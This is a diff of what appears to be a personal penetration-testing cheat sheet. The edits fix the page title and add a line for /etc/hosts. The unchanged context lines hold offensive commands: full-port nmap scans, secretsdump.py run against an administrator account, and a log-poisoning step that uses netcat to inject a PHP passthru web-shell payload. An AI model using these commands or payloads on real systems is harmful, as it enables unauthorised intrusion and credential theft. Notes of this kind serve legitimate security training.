@@ -1,8 +1,8 @@
 +++
-title = 'common.txt'
+title = 'common'
 date = 2024-08-24T16:50:47-04:00
 draft = false
-summary = "Command commands"
+summary = "Common commands"
 +++
 
 ```bash
@@ -42,7 +42,8 @@ nmap -p- -T5 -oN all-ports.nmap $IP
 nmap -p <ports list> -A $IP
 
 
-
+-------------------- Add host to /etc/hosts ----------------------
+echo "$IP <hostname>" | sudo tee -a /etc/hosts
 
 
 ------------------WEB CONTENT ---------------------------------------------------------------------------
@@ -223,7 +224,7 @@ python3 secretsdump.py administrator@192.168.190.141 -k <hash>                  
 -------------------------------------------Log Poisoning-------------------------------
 
 # If there's an LFI, check for access to log files (apache/nginx)
-# Attempt to add a php code execution parameter
+# Attempt to add a php code execution parameter (log poisoning)
 nc -nv $IP <port>
 GET /<?php passthru($_GET['fish']);?>
 
